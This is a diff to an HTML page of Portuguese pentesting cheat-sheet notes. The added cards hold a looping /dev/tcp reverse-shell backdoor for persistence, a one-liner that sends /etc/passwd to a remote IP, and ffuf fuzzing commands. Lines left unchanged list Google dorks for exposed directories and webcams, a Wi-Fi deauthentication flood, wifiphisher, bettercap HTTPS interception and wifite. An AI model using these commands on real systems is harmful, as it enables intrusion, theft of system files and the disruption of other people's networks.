@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 
+
+
 <!-- Cabeçalho -->
 
 <head>
@@ -105,12 +107,7 @@
                 <button onclick="showModalIncluse('iris')">Ver Detalhes</button>
             </div>
 
-           <!-- note 4 -->
-            <div class="note-card3">
-                <h3>OpenVAS</h3>
-                <button onclick="showModalIncluse('openvas')">Ver Detalhes</button>
-            </div>
-            
+
             <!-- note 4 -->
             <div class="note-card3">
                 <h3>SIEM Wazuh</h3>
@@ -357,7 +354,26 @@
                 <p><strong>Com /dev/tcp - </strong>exec 3<> /dev/tcp/IP_REMOTO/PORTA ;echo -e "GET / HTTP/1.1\r\nHost: IP_REMOTO\r\nConnection: close\r\n\r\n" >&3; cat <&3> NOME_ARQUIVO</p>
             </div>
 
+            <div class="note-card2">
+                <h1>Fuzzing</h1>
+                <p><strong>Fuzzing diretórios:</strong></p>
+                <p><code>ffuf -u http://target.com/FUZZ -w wordlist.txt</code></p>
+                <p><strong>Fuzzing subdomínios:</strong></p>
+                <p><code>ffuf -u https://FUZZ.victim.com -w wordlist.txt</code></p>
+            </div>
 
+            <div class="note-card2">
+                <h1>Persistência (Shell)</h1>
+                <p><strong>Shell Backdoor com While True:</strong></p>
+                <p><code>while true; do exec 3<>/dev/tcp/127.0.0.1/4545; /bin/sh 0<&3 1>&3 2>&3; sleep 5; done</p></code>
+            </div>
+
+            <div class="note-card2">
+                <h1>Exfiltrar Arquivos (Shell)</h1>
+                <p><strong>Shell Backdoor com While True:</strong></p>
+                <p><code>exec 3<>/dev/tcp/192.168.0.10/4545; cat /etc/passwd >&3; exec 3<&-; exec 3>&-</p></code>
+            </div>
+            
             <!-- note 1 -->
             <div class="note-card2">
                 <h1>Dados de Conexão</h1>
@@ -384,8 +400,8 @@
         <div class="note-card2">
             <h1>Google Dorks</h1>
             <p><strong>Finding exposed directories:</strong></p>
-            <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) -inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
-
+            <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) </code></p>
+            <p><code>-inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
             <p><strong>Discovering open webcams:</strong></p>
             <p><code>inurl:"viewerframe?mode=motion"</code></p>
 
@@ -687,11 +703,13 @@
                 -a 0 -w 3</p>
             <p>sudo airmon-ng wlan0 &lt;channel&gt;</p>
             <p>sudo iwconfig wlp4s0mon channel 1</p>
-            <p>sudo aireplay-ng --deauth 200 -a 00:31:92:AF:52:B6 wlan0</p>
+            <p> sudo aireplay-ng --deauth 0 -a {ESSID} -c FF:FF:FF:FF:FF:FF wlp4s0mon            </p>
             <p>bettercap -T 192.168.0.100 --interface at0 --no-spoofing --no-discovery --proxy --proxy-port 80
                 --proxy-https --proxy-https-port 443 -P POST</p>
             <p>sudo wifiphisher -nD -i wlan0</p>
             <p>sudo wifite --bully --kill</p>
+            <p><strong>Alterar canal da interface:</strong></p>
+            <p>sudo iw dev wlp4s0mon set channel 11</p>
 
         </div>
 
